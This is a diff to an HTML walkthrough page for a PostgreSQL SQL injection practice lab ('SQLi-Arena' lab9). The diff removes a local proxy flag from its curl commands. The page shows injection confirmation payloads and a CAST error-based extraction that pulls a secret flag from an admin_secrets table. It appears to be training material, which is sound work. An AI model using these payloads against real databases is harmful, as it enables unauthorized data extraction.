@@ -13,7 +13,7 @@
     <div class="terminal-body">
         <span class="prompt">Input: </span>report<br>
         <span class="prompt">SQL&gt; </span>SELECT id, filename, content FROM documents WHERE filename ILIKE '%report%'<br><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab9" \<br> --data-urlencode "search=report"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab9" \<br> --data-urlencode "search=report"<br><br>
         <span class="prompt">Output:</span><br>
         <strong>ID:</strong> 1 &bull; <strong>Filename:</strong> report_q1.pdf &bull; <strong>Content:</strong> Quarterly financial report for Q1 2026.
     </div>
@@ -32,10 +32,10 @@
         <span class="terminal-title">Step 2. Injection Confirmation</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab9" \<br> --data-urlencode "search=' AND 1=1 -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab9" \<br> --data-urlencode "search=' AND 1=1 -- -"<br>
         <span class="prompt">Response: </span>All 4 documents returned (TRUE condition -- wildcard match)<br>
         &nbsp;&nbsp;[report_q1.pdf, employee_list.csv, server_config.txt, backup_log.txt]<br><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab9" \<br> --data-urlencode "search=' AND 1=2 -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab9" \<br> --data-urlencode "search=' AND 1=2 -- -"<br>
         <span class="prompt">Response: </span>No documents found matching your search. (FALSE condition)
     </div>
 </div>
@@ -55,7 +55,7 @@
         <span class="terminal-title">Step 3. CAST Error Extraction</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab9" \<br> --data-urlencode "search=' AND 1=CAST((SELECT secret_value FROM admin_secrets LIMIT 1) AS INTEGER) -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab9" \<br> --data-urlencode "search=' AND 1=CAST((SELECT secret_value FROM admin_secrets LIMIT 1) AS INTEGER) -- -"<br><br>
         <span class="prompt">Response: </span><strong>Query Error:</strong> ERROR:  invalid input syntax for type integer: "FLAG{pg_c0py_t0_pr0gr4m_rc3}"
     </div>
 </div>
